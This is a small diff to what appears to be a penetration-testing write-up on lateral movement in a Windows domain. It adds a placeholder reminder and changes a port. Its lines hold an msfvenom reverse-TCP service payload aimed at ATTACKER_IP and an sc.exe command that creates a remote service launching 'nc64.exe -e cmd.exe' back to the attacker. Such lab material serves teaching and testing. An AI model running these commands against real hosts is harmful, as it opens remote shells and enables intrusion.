@@ -46,6 +46,8 @@ $ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=9
 ```
 {% endcode %}
 
+> Replace ATTACKER\_IP with IP address of your attacker machine
+
 **Uploading the payload**
 
 Now, we can upload the payload to the _IIS_ server (`smbclient`), and subsequently start a listener with `msfconsole` :
@@ -137,7 +139,7 @@ Note that it will not work if we tried to establish a reverse shell connection f
 
 {% code title="jmp.test.com (admin)" overflow="wrap" %}
 ```powershell
-C:\Windows/system32> sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443" start= auto
+C:\Windows/system32> sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 9999" start= auto
 
 C:\Windows/system32> sc.exe \\TARGET start <servicename>
 ```
